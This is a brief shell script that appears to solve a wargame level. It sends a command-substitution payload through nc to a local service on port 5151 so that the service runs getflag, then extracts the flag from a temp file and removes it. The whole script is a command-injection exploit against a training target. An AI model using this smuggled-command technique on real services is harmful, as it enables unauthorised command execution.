#!/bin/sh -eu

GETFLAG_OUTPUT=/tmp/getflag_output

echo "\$( getflag >${GETFLAG_OUTPUT} )" \
| nc localhost 5151 >/dev/null

egrep -o '[^ ]+$' ${GETFLAG_OUTPUT}

rm ${GETFLAG_OUTPUT}
